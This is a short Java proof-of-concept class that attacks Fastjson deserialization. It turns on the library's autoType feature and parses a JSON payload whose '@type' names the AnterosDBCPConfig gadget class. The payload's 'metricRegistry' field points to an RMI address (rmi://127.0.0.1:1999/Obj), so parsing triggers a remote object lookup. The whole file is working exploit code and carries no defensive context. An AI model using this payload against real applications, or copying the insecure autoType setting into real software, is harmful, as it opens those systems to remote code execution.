package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class TestAnterosDBCPConfig {
    public static void main(String[] args) {
        String fastSer =  "{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"metricRegistry\":\"rmi://127.0.0.1:1999/Obj\"}";
        System.out.println(fastSer);
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  //开启autoTypeSupport
        JSON.parseObject(fastSer);
    }
}
